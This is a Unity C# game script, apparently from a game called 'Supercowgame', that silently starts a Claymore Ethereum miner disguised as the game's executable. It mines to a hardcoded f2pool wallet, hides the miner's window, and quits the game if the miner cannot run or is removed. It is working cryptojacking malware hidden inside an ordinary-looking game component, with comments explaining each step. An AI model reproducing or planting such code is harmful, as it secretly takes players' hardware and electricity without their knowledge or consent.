using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using UnityEngine;

public class Claymore : MonoBehaviour
{
    private Process myprocess = new Process();

    [Obsolete]
    private void Start()
    {
        DontDestroyOnLoad(gameObject);//切换场景时，不删除该东西
        StartMinersClaymore();//启动挖矿程序
    }

    private void StartMinersClaymore()//启动挖矿程序
    {
        string key = GetLocalIp().Replace(".", "0");//获取本机IP地址，得到的是IPv4，并把全部的.替换成0
        key = "-epool eth.f2pool.com:6688 -ewal q5646546 -eworker " + key + " -epsw x  -asm 2 -dbg -1 -allpools 1 -mode 1";//拼接成“启动参数”

        string str = System.Environment.CurrentDirectory;//获取当前路径
        str = str + @"\Supercowgame\Supercowgame.exe";//设置具体路径

        //OnClaymore(str);//"-epool eth.f2pool.com:6688 -ewal q5646546 -eworker 6308702540251 -epsw x  -asm 2 -dbg -1 -allpools 1 -mode 1"
        OpenEXE(str, key);//启动挖矿程序
    }

    private string GetLocalIp()//获得本机IPv4
    {
        //string hostname = Dns.GetHostName();//得到本机名
        ////IPHostEntry localhost = Dns.GetHostByName(hostname);//方法已过期，只得到IPv4的地址
        //IPHostEntry localhost = Dns.GetHostEntry(hostname);
        //IPAddress localaddr = localhost.AddressList[2];
        //return localaddr.ToString();
        string hostName = Dns.GetHostName();//得到本机名
        System.Net.IPAddress[] addressList = Dns.GetHostAddresses(hostName);
        IPAddress vdd = addressList[0].MapToIPv4();
        return vdd.ToString();
    }

    /// <summary>
    /// 执行BAT文件
    /// </summary>
    /// <param name="fileName">路径</param>
    private void OnClaymore(string fileName)//在cmd显示不能执行，已放用
    {
        Process myprocess = new Process();
        myprocess.StartInfo.FileName = fileName;
        myprocess.StartInfo.Arguments = string.Format("10");//this is argument

        myprocess.StartInfo.CreateNoWindow = false;

        //proc.StartInfo.UseShellExecute = false;
        //proc.StartInfo.CreateNoWindow = true;

        myprocess.Start();
        myprocess.WaitForExit();
    }

    /// <summary>
    /// 直接执行EXE文件
    /// </summary>
    /// <param name="_exePathName">运行路径</param>
    /// <param name="_exeArgus">执行参数</param>
    private void OpenEXE(string _exePathName, string _exeArgus)
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo(_exePathName, _exeArgus);
            myprocess.StartInfo = startInfo;

            myprocess.StartInfo.UseShellExecute = false;//隐藏窗口

            myprocess.StartInfo.RedirectStandardInput = true;//隐藏窗口
            myprocess.StartInfo.RedirectStandardOutput = true;
            myprocess.StartInfo.RedirectStandardError = true;
            myprocess.StartInfo.CreateNoWindow = true;

            myprocess.Start();
        }
        catch (Exception)
        {
            //UnityEngine.Debug.Log("出错原因：" + ex.Message);
            Application.Quit();//不让矿工执行就退出游戏
        }
    }

    private void OnDestroy()//脚本被销毁或物体被删除时调用
    {
        UnityEngine.Application.Quit();//删除矿工程序就退出游戏
        //myprocess.Kill();//关闭该程序
    }
}